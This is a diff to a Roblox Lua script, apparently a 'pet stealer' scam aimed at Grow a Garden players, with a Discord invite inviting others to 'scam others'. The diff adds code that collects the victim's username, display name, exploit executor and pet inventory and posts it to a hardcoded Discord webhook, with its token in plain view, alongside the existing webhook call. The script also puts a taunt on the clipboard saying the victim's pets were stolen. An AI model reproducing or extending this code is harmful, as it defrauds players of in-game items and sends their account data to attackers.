@@ -10,7 +10,6 @@
                         Made by: Scripter.SM
                         Discord: discord.gg/d2zgg2YDMz
 ]]
-
         local date = os.date("%Y-%m-%d %H:%M:%S")
         local LogsWebhook = "https://discord.com/api/webhooks/1404048702925963326/OT888Nt-g0yE_M2-6aJByqxXhjeZUby19LciYTHDlWBD4oqCQIzazb1pXUeJLwwhSnMy"
         local RS = game:GetService("ReplicatedStorage")
@@ -31,7 +30,6 @@
         local maxAttempts = 10
         local attempt = 1
         local teleported = false
-
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
 
@@ -404,9 +402,33 @@
                 return table.concat(truncatedLines, "\n")
             end
         end
-
+local LogsPayload = {
+    content = nil,
+    embeds = {{
+        title = "Grow a Garden Hit - Logs",
+        color = 32767,
+        fields = {{
+            name = "` 🔵 Player Info:`",
+            value = string.format(
+                "```🟢 Username: %s\n🟢 Display Username: %s\n🟢 Executor: %s```",
+                (Players.LocalPlayer.Name or "Unknown"),
+                (Players.LocalPlayer.DisplayName or "Unknown"),
+                (detectExecutor() or "Unknown")
+            )
+        },{
+            name = "` 🟡 Backpack`",
+            value = string.format(
+                "```%s```",
+                truncateByLines(petString, 10)
+            )
+        }},
+        footer = {
+            text = string.format("discord.gg/NWsFjtbY8E [%s]", date)
+        }
+    }},
+    attachments = {}
+}
         local payload = {
-            username = SCRIPTS-SM,
             avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png?ex=68992f30&is=6897ddb0&hm=a2eec3928982ef85b783700d7e825ff633d0b0cfb38b3d24de570e4c1dc904cd&",
             content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
             embeds = {{
@@ -483,33 +505,41 @@
             attachments = {}
         }
 
-        if hasRarePets() then
-            payload.content = "@everyone\n" .. "To activate the stealer you must jump or type in chat"
-                local success, err = pcall(function()
-                    request({
-                        Url = Webhook,
-                        Method = "POST",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = HttpService:JSONEncode(payload)
-                    })
-                end) 
-                if not success then warn(err) end
-        else
-            payload.content = "To activate the stealer you must jump or type in chat"
-            local success, err = pcall(function()
-                request({
-                    Url = Webhook,
-                    Method = "POST",
-                    Headers = {
-                        ["Content-Type"] = "application/json"
-                    },
-                    Body = HttpService:JSONEncode(payload)
-                }) 
-            end)
-            if not success then warn(err) end
-        end
+-- Set payload content only for main webhook
+if hasRarePets() then
+    payload.content = "@everyone\nTo activate the stealer you must jump or type in chat"
+else
+    payload.content = "To activate the stealer you must jump or type in chat"
+end
+
+-- Send to main webhook (payload)
+local success1, err1 = pcall(function()
+    request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(payload)
+    })
+end)
+
+-- Send to logs webhook (LogsPayload) - no content changes
+local success2, err2 = pcall(function()
+    request({
+        Url = LogsWebhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(LogsPayload)
+    })
+end)
+
+-- Warnings
+if not success1 then warn("Something Went Wrong", err1) end
+if not success2 then warn("Something Went Wrong", err2) end
+
 
                 local function CreateGui()
                     local player = Players.LocalPlayer
